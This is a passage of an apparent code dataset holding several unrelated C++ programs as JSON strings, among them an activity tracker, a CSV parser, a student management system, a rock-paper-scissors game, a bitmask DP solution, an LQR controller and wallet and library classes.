\u043d\u0430\u0437\u0432\u0443 \u0434\u043e \u043f\u0435\u0440\u0448\u043e\u0457 \u043a\u043e\u043c\u0438\n        std::getline(iss, name, L',');\n        if (name.empty()) {\n            name = L\"\u0411\u0435\u0437 \u043d\u0430\u0437\u0432\u0438\"; // \u042f\u043a\u0449\u043e \u043d\u0430\u0437\u0432\u0430 \u043f\u043e\u0440\u043e\u0436\u043d\u044f, \u0437\u0430\u0434\u0430\u0454\u043c\u043e \u0434\u0435\u0444\u043e\u043b\u0442\u043d\u0443 \u043d\u0430\u0437\u0432\u0443\n        }\n        iss >> duration;\n        return Activity(name, duration);\n    }\n\nprivate:\n    std::wstring name;\n    int duration; // \u0442\u0440\u0438\u0432\u0430\u043b\u0456\u0441\u0442\u044c \u0432 \u0445\u0432\u0438\u043b\u0438\u043d\u0430\u0445\n};\n\n// \u041a\u043b\u0430\u0441 \u0434\u043b\u044f \u043a\u0435\u0440\u0443\u0432\u0430\u043d\u043d\u044f \u0441\u043f\u0438\u0441\u043a\u043e\u043c \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0435\u0439\nclass ActivityTracker {\npublic:\n    void addActivity(const std::wstring& name, int duration) {\n        activities.emplace_back(name, duration);\n    }\n\n    void removeActivity(const std::wstring& name) {\n        auto it = std::remove_if(activities.begin(), activities.end(),\n            [&name](const Activity& activity) {\n                return activity.getName() == name;\n            });\n        activities.erase(it, activities.end());\n    }\n\n    void displayActivities() const {\n        if (activities.empty()) {\n            std::wcout << L\"\u0421\u043f\u0438\u0441\u043e\u043a \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0435\u0439 \u043f\u043e\u0440\u043e\u0436\u043d\u0456\u0439.\" << std::endl;\n            return;\n        }\n        std::wcout << L\"\u0421\u043f\u0438\u0441\u043e\u043a \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0435\u0439:\" << std::endl;\n        for (const auto& activity : activities) {\n            std::wcout << L\"\u0410\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c: \" << (activity.getName().empty() ? L\"\u041d\u0435\u0432\u0456\u0434\u043e\u043c\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c\" : activity.getName())\n                << L\", \u0422\u0440\u0438\u0432\u0430\u043b\u0456\u0441\u0442\u044c: \" << activity.getDuration() << L\" \u0445\u0432.\" << std::endl;\n        }\n    }\n\n    int getTotalDuration() const {\n        int total = 0;\n        for (const auto& activity : activities) {\n            total += activity.getDuration();\n        }\n        return total;\n    }\n\n    void saveToFile(const std::wstring& filename) const {\n        std::wofstream ofs(filename);\n        ofs.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));\n        if (!ofs) {\n            std::wcerr << L\"\u041f\u043e\u043c\u0438\u043b\u043a\u0430 \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0442\u044f \u0444\u0430\u0439\u043b\u0443 \u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443.\" << std::endl;\n            return;\n        }\n        for (const auto& activity : activities) {\n            ofs << activity.toString() << std::endl;\n        }\n    }\n\n    void loadFromFile(const std::wstring& filename) {\n        std::wifstream ifs(filename);\n        ifs.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));\n        if (!ifs) {\n            std::wcerr << L\"\u041f\u043e\u043c\u0438\u043b\u043a\u0430 \u0432\u0456\u0434\u043a\u0440\u0438\u0442\u0442\u044f \u0444\u0430\u0439\u043b\u0443 \u0434\u043b\u044f \u0447\u0438\u0442\u0430\u043d\u043d\u044f.\" << std::endl;\n            return;\n        }\n        activities.clear();\n        std::wstring line;\n        while (std::getline(ifs, line)) {\n            if (!line.empty()) {\n                activities.push_back(Activity::fromString(line));\n            }\n        }\n    }\n\nprivate:\n    std::deque<Activity> activities;\n};\n\nint main() {\n    SetConsoleCP(65001); // \u0414\u043b\u044f \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u0437 \u043a\u043e\u043d\u0441\u043e\u043b\u0456\n    SetConsoleOutputCP(65001); // \u0414\u043b\u044f \u0432\u0438\u0432\u0435\u0434\u0435\u043d\u043d\u044f \u0432 \u043a\u043e\u043d\u0441\u043e\u043b\u044c\n    std::wcin.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));\n    std::wcout.imbue(std::locale(std::locale(), new std::codecvt_utf8<wchar_t>));\n\n    ActivityTracker tracker;\n    int choice;\n    std::wstring name;\n    int duration;\n    std::wstring filename = L\"C:\\\\Users\\\\TYMCHYK\\\\Downloads\\\\Activity.txt\";\n\n    tracker.loadFromFile(filename);\n\n    while (true) {\n        std::wcout << L\"\\n\u041c\u0435\u043d\u044e:\\n\";\n        std::wcout << L\"1. \u0414\u043e\u0434\u0430\u0442\u0438 \u0430\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c\\n\";\n        std::wcout << L\"2. \u0412\u0438\u0434\u0430\u043b\u0438\u0442\u0438 \u0430\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c\\n\";\n        std::wcout << L\"3. \u041f\u043e\u043a\u0430\u0437\u0430\u0442\u0438 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456\\n\";\n        std::wcout << L\"4. \u041f\u0456\u0434\u0440\u0430\u0445\u0443\u0432\u0430\u0442\u0438 \u0437\u0430\u0433\u0430\u043b\u044c\u043d\u0443 \u0442\u0440\u0438\u0432\u0430\u043b\u0456\u0441\u0442\u044c\\n\";\n        std::wcout << L\"5. \u0417\u0431\u0435\u0440\u0435\u0433\u0442\u0438 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456 \u0443 \u0444\u0430\u0439\u043b\\n\";\n        std::wcout << L\"6. \u0412\u0438\u0439\u0442\u0438\\n\";\n        std::wcout << L\"\u041e\u0431\u0435\u0440\u0456\u0442\u044c \u043e\u043f\u0446\u0456\u044e: \";\n        std::wcin >> choice;\n        std::wcin.ignore();\n\n        switch (choice) {\n        case 1:\n            std::wcout << L\"\u0412\u0432\u0435\u0434\u0456\u0442\u044c \u043d\u0430\u0437\u0432\u0443 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456: \";\n            std::getline(std::wcin, name);\n            std::wcout << L\"\u0412\u0432\u0435\u0434\u0456\u0442\u044c \u0442\u0440\u0438\u0432\u0430\u043b\u0456\u0441\u0442\u044c \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456 (\u0432 \u0445\u0432\u0438\u043b\u0438\u043d\u0430\u0445): \";\n            std::wcin >> duration;\n            tracker.addActivity(name, durat",
    "#include <cstdio>\n#include <cstdlib>\n#include <fstream>\n#include <iostream>\n#include <string>\n#include <vector>\n\nint get_max_row_num(std::ifstream &file) {\n  int row_num = 0;\n  std::string line;\n\n  while (getline(file, line)) {\n    row_num++;\n  }\n\n  printf(\"row_num: %d\\n\", row_num);\n  return row_num;\n}\n\nstd::vector<std::vector<int>> get_delimeter_indexes(std::ifstream &file,\n                                                    std::string line) {\n  int loc = 0;\n  int start = 0;\n  int row_idx = 0;\n\n  std::vector<std::vector<int>> delim_idxes;\n\n  while (getline(file, line)) {\n    printf(\"line: %d\\n\", row_idx);\n    while (line.find(\",\") != -1) {\n      printf(\"line: %s\\n\", line.c_str());\n      // get the index of the first delimiter\n      loc = line.find(\",\");\n      start += loc;\n      // printf(\"start: %d\\n\", start);\n      delim_idxes[row_idx].emplace_back(start);\n      // get the rest of the line\n      line = line.substr(loc + 1, line.length());\n    }\n    row_idx++;\n  }\n  return delim_idxes;\n}\n\nvoid get_value_by_index(std::ifstream &file, int row_idx, int col_idx) {\n  std::string line;\n  int loc = 0;\n  int start = 0;\n}\n\nint main() {\n  std::ifstream iFile;\n\n  const int MAX_ROW_NUM = 100;\n  std::string line;\n  std::vector<std::vector<int>> delim_idxes;\n\n  int skip_row = 1;\n  int row_idx = 0;\n  int col_idx = 0;\n\n  iFile.open(\"../data/waveband.csv\");\n  if (!iFile.is_open()) {\n    printf(\"open file failed: %d\\n\", errno);\n    exit(1);\n  }\n\n  int row_num = get_max_row_num(iFile);\n  delim_idxes = get_delimeter_indexes(iFile, line);\n\n  // \u8df3\u8fc7\u884c\u6570\n  for (auto i = 0; i < skip_row + 1; i++) {\n    getline(iFile, line);\n  }\n\n  iFile.close();\n  return 0;\n}\n",
    "#include<iostream>\r\n#include<string>\r\nusing namespace std;\r\nclass student_mangment_sytem {\r\nprivate:\r\n\tstatic const int max_size = 100;\r\n\tstring *name[max_size];\r\n\tint *id[max_size];\r\n\tstring *GPA[max_size];\r\n\tint user_size;\r\n\r\npublic:\r\n\tstudent_mangment_sytem() { \r\n\t\tfor (int i = 0; i < max_size; i++) {\r\n\t\t\tname[i] = new string();\r\n\t\t\tid[i] = new int();\r\n\t\t\tGPA[i] = new string();\r\n\t\t}\r\n\t\tuser_size = 0;\r\n\t}\r\n\tint add_student(const string &name,const int&id ,const string &gpa) {\r\n\t\t\r\n\t\t\tthis->name[user_size] = new string(name);\r\n\t\t\tthis->id[user_size] = new int(id);\r\n\t\t\tthis->GPA[user_size] = new string(gpa);\r\n\t\t\tuser_size++;\r\n\t\t\treturn 1;\r\n\t\t\r\n\t}\r\n\tbool remove_student(const int& id) {\r\n\t\tint index = -1;\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tif (*(this->id[i]) == id) {\r\n\t\t\t\tindex = i;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tif (index != -1) {\r\n\t\t\tfor (int i = index; i < user_size - 1; i++) {\r\n\t\t\t\tthis->id[i] = this->id[i + 1];\r\n\t\t\t\tthis->name[i] = this->name[i + 1];\r\n\t\t\t\tthis->GPA[i] = this->GPA[i + 1];\r\n\t\t\t}\r\n\t\t\tuser_size--;\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tbool search_student_by_name(const string&name){\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tif (*(this->name[i]) == name) {\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t  }\r\n\t\treturn false;\r\n\t}\r\n\tbool search_student_by_id(const int&id) {\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tif (*(this->id[i]) == id) {\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn false;\r\n\t}\r\n\tvoid display_all_students() {\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tif (i < user_size) { \r\n\t\t\t\tcout << \"----Data of student \" << i + 1 << \" ----\" << endl;\r\n\t\t\t\tcout << \"Student \" << \" Name = \" << *(this->name[i]) << endl;\r\n\t\t\t\tcout << \"Student_Id = \" << *(this->id[i]) << endl;\r\n\t\t\t\tcout << \"GPA =\" << *(this->GPA[i]) << endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tfloat calculate_gpa() {\r\n\t\tfloat sum = 0;\r\n\t\tfloat average =0;\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\t sum += stof(*(this->GPA[i]));\r\n\r\n\t\t }\r\n\t\taverage = sum / user_size;\r\n\t\treturn average;\r\n\t}\r\n\tstring highest_gpa()  {\r\n\t\tfloat highest_GPA = 0.0;\r\n\t\tint index=0;\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tfloat student_GPA = stof(*(this->GPA[i])); // convert string to float\r\n\t\t\tif (student_GPA > highest_GPA) {\r\n\t\t\t\thighest_GPA = student_GPA; \r\n\t\t\t\tindex=i;\r\n\t\t\t}\r\n\r\n\t\t}\r\n\t\treturn  *(this->name[index]);\r\n\t}\r\n\t~student_mangment_sytem() {\r\n\t\tfor (int i = 0; i < user_size; i++) {\r\n\t\t\tdelete this->id[i];\r\n\t\t\tdelete this->name[i];\r\n\t\t\tdelete this->GPA[i];\r\n\t\t}\r\n\t\r\n\t}\r\n};\r\n\r\nint main() {\r\n\tint option, number_of_students, id;\r\n\tfloat average;\r\n\tstring name, GPA;\r\n\tchar selection;\r\n\tstudent_mangment_sytem s1;\r\n\tdo {\r\n\t\tcout << \"\\t\\t///////////Welcome To Student Mangment System////////////\\t\\t\" << endl;\r\n\t\tcout << endl;\r\n\t\tcout << endl;\r\n\r\n\t\tcout << \"\\t---Operations You can Do---\\t\" << endl;\r\n\t\tcout <<  endl;\r\n\t\tcout << \"1) Add student with name,ID and GPA\" << endl;\r\n\t\tcout << \"2) Remove students from the university by id\" << endl;\r\n\t\tcout << \"3) Search for a student by ID or name \" << endl;\r\n\t\tcout << \"4) Display all students in the university \" << endl;\r\n\t\tcout << \"5)  Calculate the average GPA of all students\" << endl;\r\n\t\tcout << \"6) Find the student with the highest GPA\" << endl;\r\n\t\tcout << endl;\r\n\t\tcout << \"Press the number of operation you want to do:\";\r\n\t\tcin >> option;\r\n\t\tswitch (option) {\r\n\t\tcase 1:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout << \"\\t\\tAdd student with name,ID and GPA\\t\\t \" << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tcout << \"How much data of  students  you want to enter? \";\r\n\t\t\tcin >> number_of_students;\r\n\t\t\tcout << endl;\r\n\t\t\tfor (int i = 0; i < number_of_students; i++) {\r\n\t\t\t\tcout << \"Enter the name of student:\";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tgetline(cin, name);\r\n\t\t\t\tcout << \"Enter the ID: \";\r\n\t\t\t\tcin >> id;\r\n\t\t\t\tcout << \"Enter the GPA: \";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tcin >> GPA;\r\n\t\t\t\tif (s1.add_student(name, id, GPA) == 1) {\r\n\t\t\t\t\tcout << \"Student added successfully\" << endl;\r\n\t\t\t\t\tcout << endl;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tcout << \"!!!!Failed\" << endl;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 2:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout <<\"\\t\\tRemove students from the university by id\\t\\t\" << endl; \r\n\t\t\tcout << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tcout << \"Enter the ID of the student you want to remove:\";\r\n\t\t\tcin >> id;\r\n\t\t\tcout << endl;\r\n\t\t\tif (s1.remove_student(id) == true) {\r\n\t\t\t\tcout << \"Student of ID \" << id << \" removed Successfully.\" << endl;\r\n\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tcout << \"Student of this Id not found!!!!\" << endl;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase 3:\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcout << \"\\t\\t\\t Search for a student by ID or name\\t\\t\\t \" << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tcout << endl;\r\n\t\t\tcout << \"Do you want to search a student by name or by id:\";\r\n\t\t\tcin >> name;\r\n\t\t\tcout << endl;\r\n\t\t\tif (name == \"name\") {\r\n\t\t\t\tcout << \"Enter the name of student:\";\r\n\t\t\t\tcin.ignore();\r\n\t\t\t\tgetline(cin, name);\r\n\t\t\t\tif (s1.search_student_by_name(name) == true) {\r\n\t\t\t\t\tcout << \"Student of name \" << name << \" found succcessfully\" << endl;\r\n\t\t\t\t}\r\n\t\t\t\telse {\r\n\t\t\t\t\tcout << \"Student Not Found!!!!!!!\" << endl;\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t}\r\n\t",
    "\r\n#include <iostream>\r\n#include <cstdlib>\r\n\r\nusing namespace std;\r\n\r\nenum enGameChoice { Stone = 1, Paper = 2, Scissors = 3 };\r\nenum enWinner { Player1 = 1, Computer = 2, Draw = 3 };\r\n\r\nstruct stRoundInfo\r\n{\r\n\tshort RoundNumber = 0;\r\n\tenGameChoice Player1Choice;\r\n\tenGameChoice ComputerChoice;\r\n\tenWinner Winner;\r\n\tstring WinnerName;\r\n};\r\n\r\nstruct stGameResults\r\n{\r\n\tshort GameRounds = 0;\r\n\tshort Player1WinTimes = 0;\r\n\tshort Computer2WinTimes = 0;\r\n\tshort DrawTimes = 0;\r\n\tenWinner GameWinner;\r\n\tstring WinnerName = \"\";\r\n};\r\n\r\nint RandomNumber(int From, int To)\r\n{\r\n\tint randNum = rand() % (To - From + 1) + From;\r\n\r\n\treturn randNum;\r\n}\r\n\r\nstring WinnerName(short Winner)\r\n{\r\n\tstring arrWinnerName[3] = { \"Player1\", \"Computer\", \"No Winner\" };\r\n\r\n\treturn arrWinnerName[Winner - 1];\r\n}\r\n\r\nenWinner WhoWonTheRound(stRoundInfo RoundInfo)\r\n{\r\n\r\n\tif (RoundInfo.Player1Choice == RoundInfo.ComputerChoice)\r\n\t\treturn enWinner::Draw;\r\n\r\n\tswitch (RoundInfo.Player1Choice)\r\n\t{\r\n\tcase enGameChoice::Stone:\r\n\t\tif (RoundInfo.ComputerChoice == enGameChoice::Paper)\r\n\t\t\treturn enWinner::Computer;\r\n\t\tbreak;\r\n\r\n\tcase enGameChoice::Paper:\r\n\t\tif (RoundInfo.ComputerChoice == enGameChoice::Scissors)\r\n\t\t\treturn enWinner::Computer;\r\n\t\tbreak;\r\n\r\n\tcase enGameChoice::Scissors:\r\n\t\tif (RoundInfo.ComputerChoice == enGameChoice::Stone)\r\n\t\t\treturn enWinner::Computer;\r\n\t\tbreak;\r\n\r\n\t}\r\n\r\n\treturn enWinner::Player1;\r\n}\r\n\r\nstring ChoiceName(enGameChoice Choice)\r\n{\r\n\tstring arrGameChoices[3] = { \"Stone\", \"Paper\", \"Scissors\" };\r\n\r\n\treturn arrGameChoices[Choice - 1];\r\n}\r\n\r\nvoid SetWinnerScreenColor(enWinner Winner)\r\n{\r\n\tswitch (Winner)\r\n\t{\r\n\tcase enWinner::Player1:\r\n\t\tsystem(\"color 2F\");\r\n\t\tbreak;\r\n\tcase enWinner::Computer:\r\n\t\tsystem(\"color 2F\");\r\n\t\tcout << \"\\a\";\r\n\t\tbreak;\r\n\tdefault:\r\n\t\tsystem(\"color 6F\");\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\nvoid PrintRoundResults(stRoundInfo RoundInfo)\r\n{\r\n\tcout << \"\\n_______________Round [\" << RoundInfo.RoundNumber << \"] _______________\\n\";\r\n\tcout << \"Player1 Choice: \" << ChoiceName(RoundInfo.Player1Choice) << endl;\r\n\tcout << \"Computer Choice: \" << ChoiceName(RoundInfo.ComputerChoice) << endl;\r\n\tcout << \"Round Winner : \" << RoundInfo.WinnerName << endl;\r\n\tcout << \"________________________________________\\n\" << endl;\r\n\r\n\tSetWinnerScreenColor(RoundInfo.Winner);\r\n}\r\n\r\nenWinner WhoWonTheGame(short Player1WinTimes, short ComputerWinTimes)\r\n{\r\n\tif (Player1WinTimes > ComputerWinTimes)\r\n\t\treturn enWinner::Player1;\r\n\telse if (ComputerWinTimes > Player1WinTimes)\r\n\t\treturn enWinner::Computer;\r\n\telse\r\n\t\treturn enWinner::Draw;\r\n}\r\n\r\nstGameResults FillGameResults(int GameRounds, short Player1WinTimes, short ComputerWinTimes, short DrawTimes)\r\n{\r\n\tstGameResults GameResults;\r\n\r\n\tGameResults.GameRounds = GameRounds;\r\n\tGameResults.Player1WinTimes = Player1WinTimes;\r\n\tGameResults.Computer2WinTimes = ComputerWinTimes;\r\n\tGameResults.DrawTimes = DrawTimes;\r\n\tGameResults.GameWinner = WhoWonTheGame(Player1WinTimes, ComputerWinTimes);\r\n\tGameResults.WinnerName = WinnerName(GameResults.GameWinner);\r\n\r\n\treturn GameResults;\r\n}\r\n\r\nenGameChoice ReadPlayer1Choice()\r\n{\r\n\tshort Choice = 1;\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"\\nYour Choice: [1]Stone, [2]Paper, [3]Scissors : \";\r\n\t\tcin >> Choice;\r\n\r\n\t} while (Choice < 1 || Choice > 3);\r\n\r\n\treturn (enGameChoice)Choice;\r\n}\r\n\r\nenGameChoice GetComputerChoice()\r\n{\r\n\treturn (enGameChoice) RandomNumber(1, 3);\r\n}\r\n\r\nstGameResults PlayGame(short HowManyRounds)\r\n{\r\n\tstRoundInfo RoundInfo;\r\n\tint Player1WinTimes = 0, ComputerWinTimes = 0, DrawTimes = 0;\r\n\r\n\tfor (short GameRound = 1; GameRound <= HowManyRounds; GameRound++)\r\n\t{\r\n\t\tcout << \"\\nRound [\" << GameRound << \"] begins: \\n\";\r\n\t\tRoundInfo.RoundNumber = GameRound;\r\n\t\tRoundInfo.Player1Choice = ReadPlayer1Choice();\r\n\t\tRoundInfo.ComputerChoice = GetComputerChoice();\r\n\t\tRoundInfo.Winner = WhoWonTheRound(RoundInfo);\r\n\t\tRoundInfo.WinnerName = WinnerName(RoundInfo.Winner);\r\n\r\n\r\n\t\tif (RoundInfo.Winner == enWinner::Player1)\r\n\t\t\tPlayer1WinTimes++;\r\n\t\telse if (RoundInfo.Winner == enWinner::Computer)\r\n\t\t\tComputerWinTimes++;\r\n\t\telse\r\n\t\t\tDrawTimes++;\r\n\r\n\t\tPrintRoundResults(RoundInfo);\r\n\t}\r\n\r\n\treturn FillGameResults(HowManyRounds, Player1WinTimes, ComputerWinTimes, DrawTimes);\r\n}\r\n\r\nstring Tabs(short NumberOfTabs)\r\n{\r\n\tstring t = \"\";\r\n\r\n\tfor (int i = 1; i < NumberOfTabs; i++)\r\n\t{\r\n\t\tt += \"\\t\";\r\n\t}\r\n\treturn t;\r\n}\r\n\r\nvoid ShowGameOverScreen()\r\n{\r\n\r\n\tcout << Tabs(2) << \"_______________________________________________________________\\n\\n\";\r\n\tcout << Tabs(2) << \"                   +++ G a m e  O v e r +++\\n\";\r\n\tcout << Tabs(2) << \"_______________________________________________________________\\n\\n\";\r\n}\r\n\r\nvoid ShowFinalGameResults(stGameResults GameResults)\r\n{\r\n\tcout << Tabs(2) << \"_____________________ [Game Results ] _________________________\\n\";\r\n\tcout << Tabs(2) << \"Game Round : \" << GameResults.GameRounds << endl;\r\n\tcout << Tabs(2) << \"Player1 won times : \" << GameResults.Player1WinTimes << endl;\r\n\tcout << Tabs(2) << \"Computer won times : \" << GameResults.Computer2WinTimes << endl;\r\n\tcout << Tabs(2) << \"Draw times ",
    "#include <bits/stdc++.h>\n\nusing namespace std;\n\nchar ss[111];\nint N;\nvector<int> rowbit;\nint g[15][15];\nint sm[15][(1 << 15) + 1];\nint dp[15][(1 << 15) + 1];\n\nvoid init() {\n    rowbit.clear();\n    for (int i = 0 ; i < N; ++i) {\n        for (int j = 0 ; j < (1 << N); ++j) {\n            dp[i][j] = -100000000;\n            sm[i][j] = 0;\n        }\n    }\n}\n\n\nint main() {\n\n    int i, j, k;\n    while (fgets(ss, 111, stdin) != NULL) {\n        // parse and read in the grid\n        // you don't need to do something similar for the course\n        N = 0;\n        int curr = 0;\n        for (i = 0 ; i < (int) strlen(ss); ++i) {\n            if (ss[i] == ' ' || ss[i] == '\\n') {\n                g[0][N++] = curr;\n                curr = 0;\n            } else {\n                curr = curr * 10 + (ss[i] - '0');\n            }\n        }\n\n        for (i = 1; i < N; ++i) {\n            for (j = 0; j < N; ++j) {\n                scanf(\"%d\", &g[i][j]);\n            }\n        }\n\n        getchar();\n        getchar();\n        // assume now N is the size of the grid\n        // g[i][j] stores the integer on the i-th row and j-th column of the grid\n        // we do problem solving here\n        init();\n        \n        // we need to find all bit representation of a row that is valid\n        for (i = 0 ; i < (1 << N); ++i) {\n            if ((i & (i << 1)) == 0) rowbit.push_back(i);\n        }\n\n        for (i = 0 ; i < N; ++i) {\n            for (j = 0 ; j < (1 << N); ++j) {\n                for (k = 0 ; k < N; ++k) {\n                    if ((j >> k) & 1) {\n                        sm[i][j] += g[i][k];\n                    }\n                } \n            }\n        }\n        // base case\n        for (auto &valid : rowbit) {\n            dp[0][valid] = sm[0][valid];\n        }\n\n        // recursive case\n        for (i = 1; i < N; ++i) {\n            for (auto &m : rowbit) {\n                for (auto &mp : rowbit) {\n                    if (m & mp) continue; // they share an edge verically\n                    if (m & (mp << 1)) continue; // they share an edge diagnally\n                    if ((m << 1) & mp) continue; // they share an edge diagnally\n                    dp[i][m] = max(dp[i][m], dp[i-1][mp] + sm[i][m]);\n                }\n            }\n        }\n\n        int ans = 0;\n        for (auto &m : rowbit) {\n            ans = max(ans, dp[N-1][m]);\n        }\n\n        cout << ans << endl;\n    }\n    return 0;\n}",
    "#include \"controller_lqr.h\"\n\ndouble LQRInvertedPendulumController::get_output()\n{\n    Eigen::Matrix<double, 4, 1> state_error = desired_state - current_state;\n    return K.dot(state_error);\n}\n\nEigen::Matrix<double, 4, 1> LQRInvertedPendulumController::computeLQR()\n{\n    // Invert R matrix\n    Eigen::Matrix<double, 1, 1> R_inv = R_.inverse();\n\n    // Compute BR^-1B^T term\n    Eigen::Matrix<double, 4, 4> BRB = B_ * R_inv(0, 0) * B_.transpose();\n\n    // Construct the Hamiltonian matrix H\n    Eigen::Matrix<double, 8, 8> H;\n    H.topLeftCorner(4, 4) = A_;\n    H.topRightCorner(4, 4) = -BRB;\n    H.bottomLeftCorner(4, 4) = -Q_;\n    H.bottomRightCorner(4, 4) = -A_.transpose();\n\n    // Compute eigenvalues and eigenvectors of the Hamiltonian matrix\n    Eigen::ComplexEigenSolver<Eigen::Matrix<double, 8, 8>> ces;\n    ces.compute(H);\n\n    Eigen::VectorXcd eigenvalues = ces.eigenvalues();\n    Eigen::MatrixXcd eigenvectors = ces.eigenvectors();\n\n    // Select eigenvectors corresponding to eigenvalues with negative real parts\n    Eigen::MatrixXcd Vs(8, 4);\n    int index = 0;\n    for (int i = 0; i < 8; ++i)\n    {\n        if (eigenvalues(i).real() < 0 && index < 4)\n        {\n            Vs.col(index) = eigenvectors.col(i);\n            ++index;\n        }\n    }\n\n    // Check if we found enough stable eigenvalues\n    if (index != 4)\n    {\n        ROS_ERROR(\"computeLQR: Unable to find 4 stable eigenvalues.\");\n        return K; // Return current K if computation fails\n    }\n\n    // Partition Vs into Vs1 and Vs2\n    Eigen::MatrixXcd Vs1 = Vs.topRows(4);\n    Eigen::MatrixXcd Vs2 = Vs.bottomRows(4);\n\n    // Compute the solution P of the Riccati equation\n    Eigen::MatrixXcd P_c = Vs2 * Vs1.inverse();\n    Eigen::Matrix4d P = P_c.real(); // Take the real part\n\n    // Compute the LQR gain matrix K\n    Eigen::Matrix<double, 1, 4> K_temp = R_inv(0, 0) * B_.transpose() * P;\n\n    // Return K as a column vector to match Eigen::Matrix<double, 4, 1>\n    return K_temp.transpose();\n}\n",
    "//\n// Created by mihir on 9/16/2024.\n//\n\n#include \"User.h\"\n#include <string>\n#include <algorithm>\n#include <utility>\n\nUser::User(std::string  name) : userName(std::move(name)), walletBalance(0.0) {\n    // Initialize the user with the given name and set the balance to zero\n    // You can add additional initialization logic if required\n};\n\nstd::string User::getUsername() const{\n    return userName;\n}\n\ndouble User::getWalletBalance() const{\n    return walletBalance;\n}\n\nvoid User::addToBalance(const double amount){\n    walletBalance += amount;\n}\n\nvoid User::subtractFromBalance(double amount){\n    walletBalance -= amount;\n}\n\nbool User::hasSufficientBalance(double amount) const{\n    return walletBalance >= amount;\n}\n\nvoid User::addTransaction(const Transaction &transaction){\n      transactions.push_back(transaction);\n}\n\nstd::vector<Transaction> User::getTransactions(const std::string &filter, const std::string &sorter){\n    std::vector<Transaction> result = transactions;\n    if (filter == \"send\") {\n        result.erase(std::remove_if(result.begin(), result.end(), [](const Transaction &t) { return !t.isSendTransaction(); }), result.end());\n    } else if (filter == \"receive\") {\n        result.erase(std::remove_if(result.begin(), result.end(), [](const Transaction &t) { return t.isSendTransaction(); }), result.end());\n    }\n\n    if (sorter == \"amount\") {\n        std::sort(result.begin(), result.end(), [](const Transaction &a, const Transaction &b) { return a.getAmount() < b.getAmount(); });\n    } else if (sorter == \"time\") {\n        std::sort(result.begin(), result.end(), [](const Transaction &a, const Transaction &b) { return a.getTimestamp() < b.getTimestamp(); });\n    }\n    return result;\n}",
    "/*Name: Manraj Singh\r\nEmail : manraj-singh2@myseneca.ca\r\nStudent ID : 119504231\r\nSection : ZFF\r\nDate : 17 July 2034\r\n---------------------------------------------------------- -\r\nI have done all the coding by myself and only copied the code\r\nthat my professor provided to complete my workshops and assignments.\r\n---------------------------------------------------------- -*/\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#include <iomanip>\r\n#include <iostream>\r\n#include <ctime>\r\n#include \"LibApp.h\"\r\nnamespace sdds {\r\n   \r\n\tbool LibApp::confirm(const char* message) {\r\n\r\n\t\tMenu menu(message);\r\n\r\n\t\tmenu << \"Yes\";\r\n\r\n\t\tif (menu.run())\r\n\t\t{\r\n\t\t\treturn true;\r\n\t\t}\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid LibApp::load() {\r\n\t\tstd::cout << \"Loading Data\" << std::endl;\r\n\t}\r\n\r\n\tvoid LibApp::save() {\r\n\t\tstd::cout << \"Saving Data\" << std::endl;\r\n\t}\r\n\r\n\tvoid LibApp::search() {\r\n\t\tstd::cout << \"Searching for publication\" << std::endl;\r\n\t}\r\n\r\n\tvoid LibApp::returnPub() {\r\n\t\tsearch();\r\n\r\n\t\tstd::cout << \"Returning publication\" << std::endl;\r\n\t\tstd::cout << \"Publication returned\" << std::endl << std::endl;\r\n\r\n\t\tm_changed = true;\r\n\t\t\r\n\t}\r\n\r\n\tvoid LibApp::newPublication() {\r\n\r\n\t\tstd::cout << \"Adding new publication to library\" << std::endl;\r\n\t\t\r\n\t\tif (confirm(\"Add this publication to library?\")) {\r\n\r\n\t\t\tm_changed = 